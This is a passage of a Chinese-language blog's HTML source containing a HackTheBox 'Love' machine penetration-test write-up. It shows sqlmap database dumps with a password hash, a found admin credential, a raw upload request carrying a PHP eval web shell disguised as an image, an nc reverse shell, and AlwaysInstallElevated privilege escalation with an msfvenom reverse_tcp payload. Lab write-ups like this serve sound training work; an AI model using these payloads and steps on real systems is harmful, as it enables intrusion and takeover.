class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| admin    | $2y$10<span class="variable">$4E3VVe2PWlTMejquTmMD6</span>.Og9RmmFN.K5A1n99kHNdQxHePutFjsC |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T voters --columns</span><br><span class="line">Database: votesystem</span><br><span class="line">Table: voters</span><br><span class="line">[6 columns]</span><br><span class="line">+-----------+--------------+</span><br><span class="line">| Column    | Type         |</span><br><span class="line">+-----------+--------------+</span><br><span class="line">| firstname | varchar(30)  |</span><br><span class="line">| id        | int(11)      |</span><br><span class="line">| lastname  | varchar(30)  |</span><br><span class="line">| password  | varchar(60)  |</span><br><span class="line">| photo     | varchar(150) |</span><br><span class="line">| voters_id | varchar(15)  |</span><br><span class="line">+-----------+--------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.239/admin/login.php&quot;</span> -data <span class="string">&quot;username=123&amp;password=321&amp;login=&quot;</span> -D votesystem -T voters -C voters_id, password --dump</span><br><span class="line">+-----------+----------+</span><br><span class="line">| voters_id | password |</span><br><span class="line">+-----------+----------+</span><br><span class="line">+-----------+----------+</span><br></pre></td></tr></table></figure>
+<p>然而这里Hash爆破速度过慢, Bcrypt的运算复杂程度远高于md5</p>
+<p><s>看了眼别人WP</s><br />
+用443端口的功能访问本地5000得到登入凭证<br />
+<code>admin:@LoveIsInTheAir!!!!</code><br />
+<s>一直用渗透的常规思路打这台靶机, 没想到整这么一出</s><br />
+登入后台后上传Shel</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/voters_add.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.10.10.239</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------7586397232801671174932942436</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>696</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://10.10.10.239</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://10.10.10.239/admin/voters.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=uofg65u57tbm4rp6jbn0359660</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;firstname&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;lastname&quot;</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line">333</span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------7586397232801671174932942436</span><br><span class="line">Content-Disposition: form-data; name=&quot;add&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------7586397232801671174932942436--</span><br></pre></td></tr></table></figure>
+<p>蚁剑上传nc反弹shell</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\phoebe\desktop\user.txt</span><br><span class="line">fc8833cab6af6700441328fd2a4ecc04</span><br></pre></td></tr></table></figure>
+<h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2>
+<blockquote>
+<p>找到alwaysinstallelevated，即当注册表中的alwaysinstallelevated设置为1时，机器上运行任何的msi程序，均会以system权限执行，我们只需生成一个msi的木马程序即可提权。<br />
+<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/375373404">https://zhuanlan.zhihu.com/p/375373404</a></p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    0x1</span><br><span class="line"></span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">    AlwaysInstallElevated    REG_DWORD    0x1</span><br></pre></td></tr></table></figure>
+<p>msfvenom生成一个Shell即可</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">a0f54f7853efdefe4c8cef97186db4c8</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>msfvenom &amp; nc</p>
+</blockquote>
+<p>本着能不用MSF就不用了MSF的原则<br />
+没有使用meterpreter<br />
+但是发现有(staged)标识还是不能用nc直接接收Shell的<br />
+最后用<code>windows/x64/shell/reverse_tcp</code>这个Payload才能GetShell</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>xXxYOLOxXx
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://yoloyolo.top/2021/06/09/HTB-Windows-Set/" title="HTB_Windows_Set">https://yoloyolo.top/2021/06/09/HTB-Windows-Set/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pentest/" rel="tag"># Pentest</a>
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
+              <a href="/tags/Windows/" rel="tag"># Windows</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/06/04/HTB-Start-Point/" rel="prev" title="HTB_Start_Point">
+      <i class="fa fa-chevron-left"></i> HTB_Start_Point
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#love"><span class="nav-number">1.</span> <span class="nav-text"> love</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xXxYOLOxXx</p>
+  <div class="site-description" itemprop="description">Explorer for unknown.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://steamcommunity.com/id/Purple_Miracle/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;Purple_Miracle&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://yoloyolo.top/atom.xml" title="RSS → https:&#x2F;&#x2F;yoloyolo.top&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xXxYOLOxXx</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
